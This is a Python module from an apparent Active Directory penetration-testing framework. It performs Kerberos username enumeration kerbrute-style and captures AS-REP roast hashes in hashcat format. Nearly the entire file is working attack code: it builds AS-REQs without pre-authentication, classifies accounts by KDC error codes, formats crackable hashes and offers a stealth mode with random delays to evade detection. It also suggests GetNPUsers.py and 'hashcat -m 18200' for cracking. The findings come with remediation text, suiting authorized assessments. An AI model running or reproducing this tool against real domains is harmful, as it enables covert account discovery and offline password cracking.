"""Kerberos username enumeration (kerbrute-style).

Principle: send an AS-REQ without pre-authentication for each candidate
username. The KDC responds differently depending on whether the account
exists, which lets us distinguish valid users **without incrementing any
failed-login counter** on AD (no lockout).

Observed error codes:

- ``KDC_ERR_C_PRINCIPAL_UNKNOWN`` (6)     -> user does not exist.
- ``KDC_ERR_PREAUTH_REQUIRED`` (25)       -> valid user (nominal case).
- ``KDC_ERR_CLIENT_REVOKED`` (18)         -> user exists but disabled.
- *no error, AS-REP received*             -> **ASREProastable**: user
  exists and does not require Kerberos pre-authentication.
"""

from __future__ import annotations

import datetime
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from core.logger import get_logger
from core.target_manager import Credential, Finding, TargetManager

try:
    from impacket.krb5 import constants                              # type: ignore
    from impacket.krb5.asn1 import AS_REP, AS_REQ, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter  # type: ignore
    from impacket.krb5.kerberosv5 import sendReceive, KerberosError  # type: ignore
    from impacket.krb5.types import KerberosTime, Principal          # type: ignore
    from pyasn1.codec.der import decoder, encoder                    # type: ignore
    from pyasn1.type.univ import noValue                             # type: ignore

    _HAS_IMPACKET = True
except Exception:  # pragma: no cover
    _HAS_IMPACKET = False


# Minimal built-in wordlist (fallback when no file is provided).
DEFAULT_USERS = [
    "administrator", "admin", "guest", "krbtgt", "test", "user",
    "backup", "svc_admin", "svc_sql", "svc_sccm", "svc_exchange",
    "svc_iis", "sqladmin", "helpdesk", "support", "operator", "dba",
    "developer", "dev",
]


class UserEnum:
    def __init__(
        self,
        tm: TargetManager,
        domain: str,
        kdc_ip: str,
        userlist: str | Path | None = None,
        threads: int = 10,
        stealth_mode: bool = False,
    ):
        self.tm = tm
        self.domain = domain.upper()
        self.kdc_ip = kdc_ip
        self.userlist = Path(userlist) if userlist else None
        self.threads = threads
        self.stealth_mode = stealth_mode
        self.log = get_logger()

    # ------------------------------------------------------------------

    def _load_users(self) -> list[str]:
        users: list[str] = []
        if self.userlist and self.userlist.is_file():
            self.log.info(f"Wordlist: {self.userlist}")
            for line in self.userlist.read_text(
                encoding="utf-8", errors="ignore"
            ).splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    users.append(line)
        else:
            if self.userlist:
                self.log.warn(f"Wordlist not found: {self.userlist} - using built-in fallback")
            users = list(DEFAULT_USERS)

        # Also include users already discovered (SAMR, LDAP, etc.).
        users.extend(sorted(self.tm.users))
        # Dedup while preserving order.
        seen: set[str] = set()
        uniq: list[str] = []
        for u in users:
            k = u.lower()
            if k not in seen:
                seen.add(k)
                uniq.append(u)
        return uniq

    # ------------------------------------------------------------------

    def _build_as_req(self, username: str) -> bytes:
        """Build an AS-REQ without pre-auth for ``username@DOMAIN``."""
        client = Principal(
            username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        server = Principal(
            f"krbtgt/{self.domain}",
            type=constants.PrincipalNameType.NT_PRINCIPAL.value,
        )

        pac_req = KERB_PA_PAC_REQUEST()
        pac_req["include-pac"] = True
        pac_encoded = encoder.encode(pac_req)

        as_req = AS_REQ()
        as_req["pvno"] = 5
        as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        as_req["padata"] = noValue
        as_req["padata"][0] = noValue
        as_req["padata"][0]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
        )
        as_req["padata"][0]["padata-value"] = pac_encoded

        body = seq_set(as_req, "req-body")
        opts = [
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.proxiable.value,
        ]
        body["kdc-options"] = constants.encodeFlags(opts)
        seq_set(body, "sname", server.components_to_asn1)
        seq_set(body, "cname", client.components_to_asn1)
        body["realm"] = self.domain
        now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) + datetime.timedelta(days=1)
        body["till"] = KerberosTime.to_asn1(now)
        body["rtime"] = KerberosTime.to_asn1(now)
        body["nonce"] = random.getrandbits(31)

        supported = (
            int(constants.EncryptionTypes.rc4_hmac.value),
            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
        )
        seq_set_iter(body, "etype", supported)
        return encoder.encode(as_req)

    def _is_as_rep(self, reply_bytes: bytes) -> bool:
        """Return True if ``reply_bytes`` decodes as an AS_REP.

        ``impacket.sendReceive`` returns the raw reply bytes in *two*
        distinct situations:

        1. a genuine AS-REP (the account does not require pre-auth -
           ASREProastable);
        2. a KRB-ERROR carrying ``KDC_ERR_PREAUTH_REQUIRED`` (nominal
           case: the account exists and does require pre-auth).

        We therefore have to inspect the reply ourselves rather than
        rely on the absence of an exception.
        """
        try:
            decoder.decode(reply_bytes, asn1Spec=AS_REP())[0]
            return True
        except Exception:
            return False

    def _format_asrep_hash(self, username: str, as_rep_bytes: bytes) -> str | None:
        """Decode an AS-REP and return a hashcat-compatible ``$krb5asrep$`` string.

        Formats follow impacket ``GetNPUsers.py``:

        - etype 23 (RC4-HMAC):
          ``$krb5asrep$23$user@DOMAIN:<first16 bytes hex>$<rest hex>``
        - etypes 17/18 (AES-128/256):
          ``$krb5asrep$<etype>$user@DOMAIN:<last 12 bytes hex>$<prefix hex>``
        """
        try:
            as_rep = decoder.decode(as_rep_bytes, asn1Spec=AS_REP())[0]
            etype = int(as_rep["enc-part"]["etype"])
            cipher_hex = bytes(as_rep["enc-part"]["cipher"]).hex()
        except Exception as exc:
            self.log.debug(f"AS-REP decode failed for {username}: {exc}")
            return None

        if etype in (17, 18):
            return (
                f"$krb5asrep${etype}${username}@{self.domain}:"
                f"{cipher_hex[-24:]}${cipher_hex[:-24]}"
            )
        # Default (etype 23 / RC4-HMAC and any other).
        return (
            f"$krb5asrep${etype}${username}@{self.domain}:"
            f"{cipher_hex[:32]}${cipher_hex[32:]}"
        )

    def _check_user(self, username: str) -> tuple[str, str, str | None]:
        """Return ``(username, status, detail)``.

        For ``status == "asreproastable"`` the ``detail`` field carries the
        hashcat-compatible ``$krb5asrep$`` hash extracted from the AS-REP.
        """
        try:
            msg = self._build_as_req(username)
        except Exception as exc:
            return username, "error", str(exc)
        try:
            reply = sendReceive(msg, self.domain, self.kdc_ip)
            # ``sendReceive`` returns raw bytes both for a true AS_REP and
            # for a KRB-ERROR/PREAUTH_REQUIRED. Distinguish them.
            if not self._is_as_rep(reply):
                return username, "valid", None
            hash_str = self._format_asrep_hash(username, reply)
            return username, "asreproastable", hash_str
        except KerberosError as exc:
            code = exc.getErrorCode()
            if code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                return username, "unknown", None
            if code == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                return username, "valid", None
            if code == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value:
                return username, "disabled", None
            return username, "error", str(exc)
        except Exception as exc:
            return username, "error", str(exc)

    # ------------------------------------------------------------------

    def run(self) -> dict[str, list[str]]:
        if not _HAS_IMPACKET:
            self.log.error("impacket not available - Kerberos user enum disabled")
            return {}

        users = self._load_users()
        if not users:
            self.log.warn("No candidate user to test")
            return {}

        effective_threads = 1 if self.stealth_mode else self.threads
        self.log.action(
            f"Kerberos user enum on {self.domain} via KDC {self.kdc_ip} "
            f"({len(users)} candidates, {effective_threads} thread(s)"
            + (" [stealth]" if self.stealth_mode else "") + ")"
        )

        found: dict[str, list[str]] = {"valid": [], "asreproastable": [], "disabled": []}

        with ThreadPoolExecutor(max_workers=effective_threads) as pool:
            futures = {pool.submit(self._check_user, u): u for u in users}
            for fut in as_completed(futures):
                if self.stealth_mode:
                    time.sleep(random.uniform(0.5, 1.5))
                username, status, detail = fut.result()
                if status == "valid":
                    found["valid"].append(username)
                    self.tm.add_user(username)
                    self.log.success(f"  [VALID]         {username}")
                elif status == "asreproastable":
                    found["asreproastable"].append(username)
                    self.tm.add_user(username)
                    as_rep_hash = detail      # `$krb5asrep$...` or None
                    self.tm.add_credential(
                        Credential(
                            username=username,
                            domain=self.domain,
                            source="as-rep-roast-candidate",
                            ticket=as_rep_hash,
                        )
                    )
                    evidence = ""
                    if as_rep_hash:
                        evidence = (
                            as_rep_hash[:80] + "..."
                            if len(as_rep_hash) > 80
                            else as_rep_hash
                        )
                    self.tm.add_finding(
                        Finding(
                            id=f"ASREP-{username}",
                            title=f"ASREProastable account: {username}",
                            severity="high",
                            host=self.kdc_ip,
                            description=(
                                f"Account {username} does not require Kerberos "
                                "pre-auth: an AS-REP roast is possible "
                                "(offline-crackable hash)."
                            ),
                            remediation=(
                                "Disable 'Do not require Kerberos preauthentication' "
                                "on the account, or enforce a very strong password."
                            ),
                            evidence=evidence,
                            # Re-fetch the AS-REP hash (then crack with
                            # `hashcat -m 18200`).
                            command=(
                                f"GetNPUsers.py {self.domain}/{username} -no-pass "
                                f"-dc-ip {self.kdc_ip} -format hashcat"
                            ),
                        )
                    )
                    suffix = " [hash captured]" if as_rep_hash else " [hash capture failed]"
                    self.log.finding(f"[ASREP-ROAST]   {username}{suffix}")
                elif status == "disabled":
                    found["disabled"].append(username)
                    self.log.info(f"  [DISABLED]      {username}")
                elif status == "error":
                    self.log.debug(f"  [ERR] {username}: {detail}")

        self.log.success(
            "Kerberos enum complete: "
            f"{len(found['valid'])} valid, "
            f"{len(found['asreproastable'])} ASREP-roastable, "
            f"{len(found['disabled'])} disabled"
        )
        return found
